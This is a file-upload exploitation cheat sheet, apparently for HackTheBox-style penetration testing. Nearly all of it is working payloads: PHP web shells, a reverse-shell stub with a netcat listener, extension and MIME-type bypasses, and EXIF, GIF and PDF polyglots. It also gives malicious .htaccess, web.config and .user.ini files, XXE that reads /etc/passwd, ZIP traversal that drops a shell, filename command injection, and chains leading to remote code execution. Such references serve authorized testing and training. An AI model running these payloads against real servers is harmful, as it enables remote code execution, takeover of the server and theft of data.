> Basic Arbitrary Upload


```bash
# Simple PHP web shell
<?php system($_GET['cmd']); ?>

# Hello world test
<?php echo "Hello HTB"; ?>

# Reverse shell (pentestmonkey)
$ip='OUR_IP'; $port=OUR_PORT;
nc -lvnp OUR_PORT
```
> Extension Bypass

```c
# Alternate PHP extensions
shell.phtml
shell.php5
shell.php7
shell.php3
shell.phar
shell.pht
shell.inc
shell.shtml

# Mixed case / obfuscation
shell.PHP
shell.pHp
shell.PHp5
shell.Phtml
shell.php....

# Double extensions
shell.jpg.php
image.png.phtml

# Null byte / encoded tricks
shell.php%00.jpg
shell.php%20
shell.php%0a
shell.php/
shell.php::$data    (NTFS ADS)

# Fake extension prepending
goodfile.png.php
file.asp:.jpg

# Long filename truncation
A...(232 chars).php.png
```

> Content-Type & Magic Bytes Bypass

```c
# Change Content-Type header
Content-Type: image/png
Content-Type: application/octet-stream
Content-Type: text/plain

# Inject EXIF payload
exiftool -Comment='<?php system($_POST["cmd"]); ?>' shell.jpg

# Magic bytes injection
echo "GIF8" > shell.php
echo "<?php system($_GET['cmd']); ?>" >> shell.php
```

> Config File Upload Attacks

```c
# Apache: .htaccess
AddType application/x-httpd-php .jpg
AddHandler application/x-httpd-php .gif

# ASP.NET: web.config
<configuration>
 <system.webServer>
   <handlers>
     <add name="shell" path="*.jpg" verb="*" modules="IsapiModule"
     scriptProcessor="c:\windows\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Script" />
   </handlers>
 </system.webServer>
</configuration>

# PHP: .user.ini
auto_prepend_file=shell.jpg

# Misconfigs
shell.php;.jpg
shell.php%20
```

> Polyglot Tricks

```c
# GIFAR (GIF + JAR + PHP)
GIF8<?php system($_GET['cmd']); ?>

# ZIP + PHP dual format
cat shell.php legit.zip > polyglot.zip.php

# PNG IDAT injection
(valid PNG header + PHP payload inside)

# PHP inside PDF
%PDF-1.3
<?php system($_GET['cmd']); ?>
```

> Whitelist Bypass

```c
# Double extensions
shell.jpg.php

# Reverse double extension
shell.php.jpg

# Character injection tricks
shell.php%00.jpg
shell.aspx:.jpg
shell.jpg::$data

# Case insensitive bypass
shell.PHp
```

> Limited Upload → Other Vulns

```c
# XSS via HTML upload
<script>alert(document.domain)</script>

# XSS via EXIF
exiftool -Artist='"><script>alert(1)</script>' xss.jpg

# SVG with XSS
<svg><script>alert(1)</script></svg>

# SVG with XXE
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

# XXE to read PHP source
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

> Decompression Abuse
```c
# Symlink trick
ln -s /etc/passwd link.txt
zip --symlinks evil.zip link.txt

# Directory traversal in ZIP
python - <<EOF
import zipfile
z = zipfile.ZipFile("evil.zip", "w")
z.writestr("../../../../var/www/html/shell.php", "<?php system($_GET['cmd']); ?>")
z.close()
EOF

# Evilarc
python evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```

> File Name Injection

```c
# OS command injection
file$(whoami).jpg
file.jpg||id

# SQL injection
file';select+sleep(5);--.jpg

# XSS in filename
<script>alert(1)</script>.jpg
```

> Attack Chains

```c
# Example 1 – Apache + .htaccess
1. Upload shell.jpg (with PHP payload)
2. Upload .htaccess: AddType application/x-httpd-php .jpg
3. Visit /uploads/shell.jpg?cmd=id

# Example 2 – Whitelist bypass
1. Allowed: .jpg
2. Upload shell.php.jpg
3. Apache executes as PHP

# Example 3 – Polyglot GIF
1. GIF header + PHP code
2. Upload shell.gif
3. If executed as PHP → RCE

# Example 4 – Windows ADS
1. Upload shell.aspx:.jpg
2. IIS executes as ASPX
```

> Automation

```c
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```
